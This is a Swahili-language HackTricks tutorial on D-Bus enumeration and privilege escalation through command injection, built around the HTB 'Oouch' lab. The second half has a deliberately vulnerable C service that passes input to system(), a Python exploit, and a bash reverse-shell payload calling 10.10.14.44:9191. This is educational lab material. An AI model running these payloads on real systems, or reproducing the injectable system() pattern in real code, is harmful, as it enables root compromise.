# D-Bus Enumeration & Command Injection Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **GUI enumeration**

D-Bus inatumika kama mjumbe wa mawasiliano kati ya michakato (IPC) katika mazingira ya desktop ya Ubuntu. Katika Ubuntu, uendeshaji wa pamoja wa mabasi kadhaa ya ujumbe unashuhudiwa: basi la mfumo, ambalo linatumika hasa na **huduma zenye mamlaka kutoa huduma zinazohusiana katika mfumo mzima**, na basi la kikao kwa kila mtumiaji aliyeingia, likitoa huduma zinazohusiana tu na mtumiaji huyo maalum. Mwelekeo hapa ni hasa kwenye basi la mfumo kutokana na uhusiano wake na huduma zinazotumia mamlaka ya juu (mfano, root) kwani lengo letu ni kuinua mamlaka. Inabainika kwamba usanifu wa D-Bus unatumia 'router' kwa kila basi la kikao, ambayo inawajibika kwa kuelekeza ujumbe wa wateja kwa huduma zinazofaa kulingana na anwani iliyotolewa na wateja kwa huduma wanayotaka kuwasiliana nayo.

Huduma kwenye D-Bus zin defined na **vitu** na **mifumo** wanayotoa. Vitu vinaweza kulinganishwa na mifano ya darasa katika lugha za OOP za kawaida, ambapo kila mfano unatambulika kwa kipekee na **njia ya kitu**. Njia hii, kama njia ya mfumo wa faili, inatambulisha kipekee kila kitu kinachotolewa na huduma. Msingi muhimu wa utafiti ni **org.freedesktop.DBus.Introspectable** interface, yenye njia moja, Introspect. Njia hii inarudisha uwakilishi wa XML wa njia zinazoungwa mkono za kitu, ishara, na mali, huku ikizingatia hapa njia huku ikiacha mali na ishara.

Kwa mawasiliano na kiolesura cha D-Bus, zana mbili zilitumika: zana ya CLI inayoitwa **gdbus** kwa urahisi wa kuitisha njia zinazotolewa na D-Bus katika scripts, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), zana ya GUI inayotumia Python iliyoundwa kuorodhesha huduma zinazopatikana kwenye kila basi na kuonyesha vitu vilivyomo ndani ya kila huduma.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


Katika picha ya kwanza, huduma zilizoorodheshwa na mfumo wa D-Bus zinaonyeshwa, huku **org.debin.apt** ikisisitizwa hasa baada ya kuchagua kitufe cha System Bus. D-Feet inachunguza huduma hii kwa vitu, ikionyesha interfaces, methods, properties, na signals za vitu vilivyochaguliwa, kama inavyoonekana katika picha ya pili. Saini ya kila method pia imeelezwa kwa undani.

Kipengele muhimu ni kuonyeshwa kwa **process ID (pid)** na **command line** ya huduma, ambayo ni muhimu kuthibitisha ikiwa huduma inafanya kazi na haki za juu, muhimu kwa umuhimu wa utafiti.

**D-Feet pia inaruhusu mwito wa method**: watumiaji wanaweza kuingiza maelekezo ya Python kama vigezo, ambayo D-Feet inabadilisha kuwa aina za D-Bus kabla ya kupitisha kwa huduma.

Hata hivyo, kumbuka kwamba **method zingine zinahitaji uthibitisho** kabla ya kuturuhusu kuzitumia. Tutazipuuza method hizi, kwani lengo letu ni kuongeza haki zetu bila hati za kuingia kwanza.

Pia kumbuka kwamba baadhi ya huduma zinachunguza huduma nyingine ya D-Bus inayoitwa org.freedeskto.PolicyKit1 ikiwa mtumiaji anapaswa kuruhusiwa kufanya vitendo fulani au la.

## **Cmd line Enumeration**

### Orodha ya Vitu vya Huduma

Inawezekana kuorodhesha interfaces za D-Bus zilizofunguliwa kwa:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wakati mchakato unapoanzisha muunganisho na basi, basi inatoa muunganisho jina maalum la basi linaloitwa _jina la muunganisho la kipekee_. Majina ya basi ya aina hii hayabadiliki—imehakikishwa hayatabadilika kadri muunganisho unavyokuwepo—na, muhimu zaidi, hayawezi kutumika tena wakati wa maisha ya basi. Hii inamaanisha kwamba hakuna muunganisho mwingine kwa basi hiyo utapata jina kama hilo la muunganisho wa kipekee, hata kama mchakato huo huo unafunga muunganisho na kuunda mpya. Majina ya muunganisho wa kipekee yanaweza kutambulika kwa urahisi kwa sababu yananza na tabia ya koloni—ambayo kwa kawaida inakatazwa.

### Service Object Info

Kisha, unaweza kupata taarifa fulani kuhusu kiolesura kwa:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Orodha ya Mifumo ya Kihuduma

Unahitaji kuwa na ruhusa za kutosha.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

Kumbuka jinsi katika mfano huu ilichaguliwa interface ya hivi punde iliyogunduliwa kwa kutumia parameter ya `tree` (_ona sehemu iliyopita_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Note njia `.Block` ya interface `htb.oouch.Block` (ile ambayo tunavutiwa nayo). "s" ya safu nyingine inaweza kumaanisha kwamba inatarajia string.

### Monitor/Capture Interface

Kwa ruhusa za kutosha (tu `send_destination` na `receive_sender` ruhusa hazitoshi) unaweza **kuchunguza mawasiliano ya D-Bus**.

Ili **kuchunguza** **mawasiliano** unahitaji kuwa **root.** Ikiwa bado unakutana na matatizo ukiwa root angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Ikiwa unajua jinsi ya kuunda faili ya usanidi ya D-Bus ili **kuruhusu watumiaji wasiokuwa root kunusa** mawasiliano tafadhali **wasiliana nami**!
{% endhint %}

Njia tofauti za kuchunguza:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Katika mfano ufuatao, kiolesura `htb.oouch.Block` kinachunguzwa na **ujumbe "**_**lalalalal**_**" unatumwa kupitia mawasiliano mabaya**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
You can use `capture` instead of `monitor` to save the results in a pcap file.

#### Filtering all the noise <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ikiwa kuna taarifa nyingi sana kwenye basi, pitisha sheria ya mechi kama ifuatavyo:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Mifumo mingi inaweza kufafanuliwa. Ikiwa ujumbe unalingana na _yoyote_ ya mifumo, ujumbe utaonyeshwa. Kama hivi:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Tazama [dokumenti ya D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi kuhusu sintaksia ya sheria za mechi.

### Zaidi

`busctl` ina chaguzi zaidi, [**pata zote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Hali ya Hatari**

Kama mtumiaji **qtc ndani ya mwenyeji "oouch" kutoka HTB** unaweza kupata **faili ya usanidi ya D-Bus isiyotarajiwa** iliyoko _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Kumbuka kutoka kwenye usanidi wa awali kwamba **utahitaji kuwa mtumiaji `root` au `www-data` ili kutuma na kupokea taarifa** kupitia mawasiliano haya ya D-BUS.

Kama mtumiaji **qtc** ndani ya kontena la docker **aeb4525789d8** unaweza kupata baadhi ya msimbo unaohusiana na dbus katika faili _/code/oouch/routes.py._ Huu ndio msimbo wa kuvutia:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kama unavyoona, inafanya **kuungana na kiolesura cha D-Bus** na kutuma kwa **"Block" function** "client\_ip".

Katika upande mwingine wa muunganisho wa D-Bus kuna binary iliyokamilishwa kwa C inayoendesha. Hii code inafanya **kusikiliza** katika muunganisho wa D-Bus **kwa anwani ya IP na inaita iptables kupitia `system` function** kuzuia anwani ya IP iliyotolewa.\
**Kuitwa kwa `system` kuna hatari kwa makusudi kwa ajili ya kuingilia amri**, hivyo payload kama ifuatavyo itaunda shell ya kurudi: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Fanya hivyo

Mwisho wa ukurasa huu unaweza kupata **kodi kamili ya C ya programu ya D-Bus**. Ndani yake unaweza kupata kati ya mistari 91-97 **jinsi ya `D-Bus object path`** **na `interface name`** **zinavyosajiliwa**. Taarifa hii itakuwa muhimu kutuma taarifa kwa muunganisho wa D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Pia, katika mstari wa 57 unaweza kupata kwamba **njia pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndio maana katika sehemu inayofuata payloads zitatumwa kwa kitu cha huduma `htb.oouch.Block`, kiolesura `/htb/oouch/Block` na jina la njia `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Mfuatano wa msimbo wa python utatuma mzigo kwa muunganisho wa D-Bus kwa njia ya `Block` method kupitia `block_iface.Block(runme)` (_kumbuka kwamba ilitolewa kutoka sehemu ya awali ya msimbo_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl na dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` ni chombo kinachotumika kutuma ujumbe kwa “Message Bus”
* Message Bus – Programu inayotumiwa na mifumo kuwezesha mawasiliano kati ya programu kwa urahisi. Inahusiana na Message Queue (ujumbe umewekwa kwa mpangilio) lakini katika Message Bus ujumbe unatumwa kwa mfano wa usajili na pia ni wa haraka sana.
* “-system” lebo inatumika kutaja kwamba ni ujumbe wa mfumo, si ujumbe wa kikao (kwa chaguo-msingi).
* “–print-reply” lebo inatumika kuchapisha ujumbe wetu ipasavyo na kupokea majibu yoyote kwa muundo unaoweza kusomeka na binadamu.
* “–dest=Dbus-Interface-Block” Anwani ya kiolesura cha Dbus.
* “–string:” – Aina ya ujumbe tunayotaka kutuma kwa kiolesura. Kuna mifumo kadhaa ya kutuma ujumbe kama vile double, bytes, booleans, int, objpath. Kati ya hizi, “object path” ni muhimu tunapotaka kutuma njia ya faili kwa kiolesura cha Dbus. Tunaweza kutumia faili maalum (FIFO) katika kesi hii kupitisha amri kwa kiolesura kwa jina la faili. “string:;” – Hii ni kuitisha tena njia ya kitu ambapo tunaweka faili/amri ya FIFO reverse shell.

_Kumbuka kwamba katika `htb.oouch.Block.Block`, sehemu ya kwanza (`htb.oouch.Block`) inarejelea kitu cha huduma na sehemu ya mwisho (`.Block`) inarejelea jina la mbinu._

### C code

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Marejeo
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
